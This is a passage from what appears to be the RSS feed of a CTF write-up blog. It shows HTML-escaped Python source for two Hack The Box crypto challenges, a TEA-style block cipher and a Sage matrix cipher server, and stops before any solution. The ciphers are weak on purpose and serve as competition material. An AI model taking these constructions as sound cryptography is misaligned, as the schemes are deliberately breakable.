&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk6">8&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">blocks&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1">:&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk6">8&lt;/span>&lt;span class="mtk1">] &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">range&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">len&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">), &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk6">8&lt;/span>&lt;span class="mtk1">)]&lt;/span>
&lt;span class="mtk1"> &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">''&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mode&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Mode&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">ECB&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">pt&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">blocks&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt_block&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">pt&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">elif&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">mode&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Mode&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">CBC&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">X&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">IV&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">pt&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">blocks&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">enc_block&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt_block&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">_xor&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">X&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">pt&lt;/span>&lt;span class="mtk1">))&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">enc_block&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">X&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">enc_block&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">encrypt_block&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">m0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">b2l&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">[:&lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">])&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">m1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">b2l&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">msg&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">:])&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">K&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">KEY&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msk&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">)) &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">range&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">32&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">DELTA&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">m0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+=&lt;/span>&lt;span class="mtk1"> ((&lt;/span>&lt;span class="mtk1">m1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">K&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">]) &lt;/span>&lt;span class="mtk5">^&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">m1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">^&lt;/span>&lt;span class="mtk1"> ((&lt;/span>&lt;span class="mtk1">m1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">5&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">K&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">])&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">m0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;amp;=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msk&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">m1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+=&lt;/span>&lt;span class="mtk1"> ((&lt;/span>&lt;span class="mtk1">m0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">K&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">]) &lt;/span>&lt;span class="mtk5">^&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk1">m0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">s&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">^&lt;/span>&lt;span class="mtk1"> ((&lt;/span>&lt;span class="mtk1">m0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">5&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">K&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk6">3&lt;/span>&lt;span class="mtk1">])&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">m1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;amp;=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">msk&lt;/span>
&lt;span class="mtk1"> &lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">m&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> ((&lt;/span>&lt;span class="mtk1">m0&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk5">//&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">)) &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">m1&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">&amp;amp;&lt;/span>&lt;span class="mtk1"> ((&lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">BLOCK_SIZE&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk3"># m = m0 || m1&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">l2b&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">m&lt;/span>&lt;span class="mtk1">)&lt;/span>



&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">'__main__'&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">KEY&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">urandom&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Cipher&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">KEY&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">FLAG&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">with&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">open&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'output.txt'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">'w'&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">as&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">write&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'Key : &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">KEY&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">Ciphertext : &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>&lt;span class="mtk6">}&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We also have the output of the script:&lt;/p></description></item><item><title>Inside The Matrix</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/inside-the-matrix/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/inside-the-matrix/</guid><description>&lt;p>We are given the source code of the server in Python:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> sage.all_cmdline &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>
&lt;span class="mtk3"># from utils import ascii_print&lt;/span>
&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>

&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">"HTB{????????????????????}"&lt;/span>
&lt;span class="mtk5">assert&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">len&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">25&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Book&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">size&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">5&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">prime&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">None&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">parse&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">pt&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">pt&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">b&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">pt&lt;/span>&lt;span class="mtk1">]&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> matrix(GF(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">prime&lt;/span>&lt;span class="mtk1">), &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">size&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">size&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">pt&lt;/span>&lt;span class="mtk1">)&lt;/span> 

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">generate&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">urandom&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">size&lt;/span>&lt;span class="mtk5">**&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">parse&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">rotate&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">prime&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> random_prime(&lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk5">**&lt;/span>&lt;span class="mtk6">6&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">False&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk5">**&lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">rotate&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">generate&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">parse&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">key&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">key&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">menu&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"Options:&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"[L]ook at page"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"[T]urn page"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">print&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"[C]heat&lt;/span>&lt;span class="mtk6">\n&lt;/span>&lt;span class="mtk4">"&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">input&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"&amp;gt; "&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">option&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">():&lt;/span>
